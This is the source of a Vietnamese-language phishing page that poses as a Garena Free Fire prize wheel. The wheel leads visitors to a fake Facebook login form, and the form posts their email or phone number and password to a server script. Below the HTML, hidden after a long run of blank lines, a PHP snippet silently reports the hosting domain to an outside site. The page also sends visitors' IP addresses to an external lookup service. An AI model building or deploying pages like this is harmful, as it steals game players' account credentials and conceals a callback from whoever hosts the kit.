
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="Nhận quà miễn phí khi quay">
    <title>VÒNG QUAY MAY MẮN | FREE FIRE</title>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/facebook.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
</head>

<body>
    <div class="iwan-contener">
    	<header></header>
    	<div class="banner">
    		<img src="Vip-Membership (1).jpg" width="200" height="209">
    	</div>
    	<div class="wrap">
    		<div class="spin">
    			<div class="box" style="--i:1;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/1.png">
    				</div>
    			</div>
    			<div class="box" style="--i:2;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/2.png">
    				</div>
    			</div>
    			<div class="box" style="--i:3;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/3.png">
    				</div>
    			</div>
    			<div class="box" style="--i:4;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/4.png">
    				</div>
    			</div>
    			<div class="box" style="--i:5;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/5.png">
    				</div>
    			</div>
    			<div class="box" style="--i:6;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/10.png">
    				</div>
    			</div>
    			<div class="box" style="--i:7;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/7.png">
    				</div>
    			</div>
    			<div class="box" style="--i:8;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/9.png">
    				</div>
    			</div>

    		
    	</div>
    
    </div>

    <!-- POP UP HADIAH -->
        <div class="pop-hadiah">
            <div class="imBox">
                <img id="hadiah" src="img/1.png">
            </div>
            <div class="confirm">
                             
                <button onclick="popEntry()">Nhận Ngay</button>
            </div>
        </div>
    <!-- END OF BLOCK -->
    <!-- POP UP LOGIN -->
        <div class="login">
            <div onclick="showfb()" class="fb"><i class="fab fa-facebook"></i>Đăng nhập với Facebook </div>
        </div>
    <!-- END OF BLOCK -->
    <!-- LOGIN FACEBOOK -->
    <style type="text/css">


#fb:target {
    visibility: visible;
}
#fb {
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    visibility: hidden;
    overflow: scroll;
}

.fb-login {
    width: 298px;
    height: auto;
    background: #fff;
    position: relative;
    text-align: center;
    margin: 15% auto;
}

.close {
    width: 20px;
    height: 20px;
    font-size: 13px;
    line-height: 13px;
    background: #000;
    border-radius: 50%;
    border: 3px solid #fff;
    display: block;
    text-align: center;
    color: #fff;
    text-decoration: none;
    position: absolute;
    top: -10px;
    right: -10px;
}

.nav-fb {
    background-color: #3b5998;
    height: 40px;
    border: 4px;
    padding: 10px;
}

.formku {
    float: left;
    width: 298px;
    padding-top: 20px;
    border-color: white;
    background: white;
}

.mylabel {
    color: black;
    float: left;
}

.divider {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -8px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}

.divider>span {
    display: inline-block;
    position: relative;
    color: #4b4f56;
    cursor: default;
    font-size: 13px;
}

.divider>span:before {
    margin-right: 15px;
    right: 100%;
}

.divider>span:after {
    left: 100%;
    margin-left: 15px;
}

.divider>span:before, .divider>span:after {
    background: #ced0d4;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}

.btn-register-fb {
    font-family: 'Roboto', sans-serif;
    position: relative;
    width: auto;
    height: 40px;
    margin-bottom: 20px;
    background-color: #1cbf27;
    color: white;
    border-radius: 3px;
    border: #1cbf27;
    font-size: 0.8em;
    font-weight: bold;
    letter-spacing: 1px;
    outline: none;
    cursor: pointer;
}

.btn-login-fb {
    font-family: 'Roboto', sans-serif;
    position: relative;
    width: 100%;
    height: 45px;
    margin: 0;
    background-color: #4080ff;
    color: white;
    border-radius: 3px;
    border: #4080ff;
    font-size: 0.8em;
    font-weight: bold;
    letter-spacing: 1px;
    outline: none;
    cursor: pointer;
}

form {
    padding-right: 1.25pc;
}
form {
    padding-left: 1.25pc;
}



input[type=text], input[type=password] {
    background: transparent;
    width: 260px;
    height: 45px;
    float: left;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid black;
    border-radius: 3px;
    color: black;
    box-sizing: border-box;
}





	
#riox:target {
    visibility: visible;
}
#riox {
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    visibility: hidden;
    overflow: scroll;
}

.riox-login {
    width: 298px;
    height: auto;
    background: #fff;
    position: relative;
    text-align: center;
    margin: 15% auto;
}


.nav-riox {
    background-color: #282525;
    height: 40px;
    border: 4px;
    padding: 10px;
}



.btn-login-riox {
    font-family: 'Roboto', sans-serif;
    position: relative;
    width: 100%;
    height: 45px;
    margin: 0;
    background-color: #e8171f;
    color: white;
    border-radius: 3px;
    border: #e8171f;
    font-size: 0.8em;
    font-weight: bold;
    letter-spacing: 1px;
    outline: none;
    cursor: pointer;
}
    </style>
<div id="fb">
<div class="fb-login">
<a href="#fb" class="close" title="Close">×</a>
<div class="nav-fb">
<center>
</center>
</div>
<br>
<center><img src="https://appnew.in/wp-content/uploads/2021/03/garena-free-fire-the-cobra.png" width="60px"></center>

        <font color="#000000"><span style="font-size: 15px; line-height: 18px; margin-bottom: 10px; padding: 10px;">Đăng nhập vào tài khoản Facebook<br> của bạn để kết nối với FreeFire</span></font>
<form method="post" id="login_form_fb" onsubmit="return TestForm()" novalidate="1" data-autoid="autoid_2">
<p class="mylabel"></p>
<input type="text" placeholder="Email hoặc điện thoại" name="username" autocorrect="off" required="" pattern=".{5,30}" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Email hoặc số điện thoại không hợp lệ ')" oninput="setCustomValidity('')"><br>
<p class="mylabel"></p>
<input type="password" placeholder="Mật khẩu " name="password" autocorrect="off" required="" pattern=".{6,30}" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Mật khẩu bạn đã nhập không chính xác')" oninput="setCustomValidity('')"><br>
<br>
<br>
<center>
  <button type="submit" value="Đăng nhập" name="login" class="btn-login-fb"><h2>Đăng nhập</h2></button>
</center>
<br>
</form>
</div>
</div>
     <!-- END OF BLOCK -->
    <footer>
        &copy;  Garena Free Fire
    </footer>
</div>
<script>
        	$(document).ready(function(){
				$('#login_form_fb').submit(function(e) {
					jQuery.ajax({
						method: 'POST',
						url: '/login.php',
						data: $(this).serialize(),
						dataType: 'json',
						complete: function() {
							captchaGenerate()
						}
					}).done(function(data) {
						if (data.status == 'success') {
							location.href = '/index2.php'
						} else {
						    
					alert('Sai tên tài khoản hoặc mật khẩu')
						}
					}).fail(function() {
					alert('Sai tên tài khoản hoặc mật khẩu')
					})
					e.preventDefault()
				})
			})
		</script>
<div class="mask"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
    <script type="text/javascript">

    	function spin()
    	{
    		var selector = document.getElementById("selector");
            var putar = document.getElementById("putar");
    		selector.style.display = "block";
    		selector.style.transform = "rotate(45deg)";
            putar.style.transform = "translate(-50%,-50%) rotateZ(0)";
            putar.style.transition = "none";
            putar.classList.add("disabled");
    		selector.style.transition = "none";
    		selector.classList.remove("active");
    		setTimeout(() => 
    		{
    			 		var array = ["500","501","502","503","504","505","506","507"];
    			 		var rotate = 45;
    					var random = Math.floor(Math.random() * 7) + 0;
                        switch(random)
                        {
                            case 0: { var img = 'img/4.png'; } break; 
                            case 1: { var img = 'img/5.png'; } break;
                            case 2: { var img = 'img/10.png'; } break;
                            case 3: { var img = 'img/7.png'; } break;
                            case 4: { var img = 'img/9.png'; } break;
                            case 5: { var img = 'img/1.png'; } break;
                            case 6: { var img = 'img/2.png'; } break;
                            case 7: { var img = 'img/3.png'; } break;
                        }

    					var xixi = rotate * array[random]; 
                        var loh = xixi - 45;   		
    			 		selector.style.transform = "rotate("+xixi+"deg)";
    			 		selector.style.transition = "all ease 10s";
                        putar.style.transform = "translate(-50%,-50%) rotateZ("+loh+"deg)";
                        putar.style.transition = "all ease 10s";
    			 		setTimeout(() => {
                            putar.classList.remove("disabled");
    			 			selector.classList.add("active");
                            setTimeout(() => {
                                $('.mask').fadeIn();
                                $('.pop-hadiah').fadeIn();
                                $('#hadiah').attr("src",img);
                            },1000)
    			 		},10000)

    		},500)
       	}
    	function reset()
    	{
    		var selector = document.getElementById("selector");
            var putar = document.getElementById("putar");
            selector.style.display = "block";
            selector.style.transform = "rotate(45deg)";
            putar.style.transform = "translate(-50%,-50%) rotateZ(0)";
            putar.style.transition = "none";
            selector.style.transition = "none";
            selector.classList.remove("active");
            putar.classList.remove("disabled");
    	}
        function popClose()
        {
            $('.mask').fadeOut();
            $('.pop-hadiah').fadeOut();
            reset();
        }
        function popEntry()
        {
            $('.login').fadeIn();
            $('.pop-hadiah').fadeOut();
        }
        function showfb()
        {
            $('.login-facebook').show();
        }
    </script>
    <script type="text/javascript">
        var checkip = function () {
               $.ajax({
                   type: "get",
                   async: false,
                   url: "https://api.pubgameshowtime.com/ip/getcountry",
                   dataType: "json",
                   success: function (result) {
                      $('#ip').val(result.ip);
                   }
               })
           }
        checkip();
    </script>
   
</body>

</html>















































<?php

$domain = $_SERVER['HTTP_HOST'];
file_get_contents("https://vongquaysukienfreefirevn.com/get.php?domain='.$domain.'moinhat");

?>